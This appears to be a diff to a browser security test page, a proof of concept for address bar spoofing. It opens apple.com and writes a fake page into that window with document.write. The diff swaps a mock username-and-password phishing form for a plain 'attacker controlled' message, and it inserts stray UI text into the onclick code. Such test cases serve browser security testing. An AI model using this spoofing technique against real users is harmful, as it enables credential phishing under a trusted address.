@@ -1,15 +1,8 @@
 <h1>Address Bar Spoofing: via document.write</h1>
-<p class="test"><input type="button" value="Run test case" onclick="
+<p class="test"><input type="button" value="Run test case" onclick="Add commentMore actions
         if(window.open.toString()!=&quot;function open&quot;+Function.prototype.toString().substr(9)) {
                 delete window.open;
         }
         w = window.open(&quot;https://www.apple.com&quot;, &quot;_blank&quot;);
-        w.document.write((` <h1> Phishing Page - Sign in to Your Account</h1>
-          <form>
-            <input placeholder='Username'><br>
-            <input type='password' placeholder='Password'><br>
-            <button>Login</button>
-          </form>
-          <b></b>
-          <h2>Check the Address Bar</h2>`);
+        w.document.write(&quot; Check the Address Bar - Attacker controlled Phishing page is here &quot;);
 " /></p>
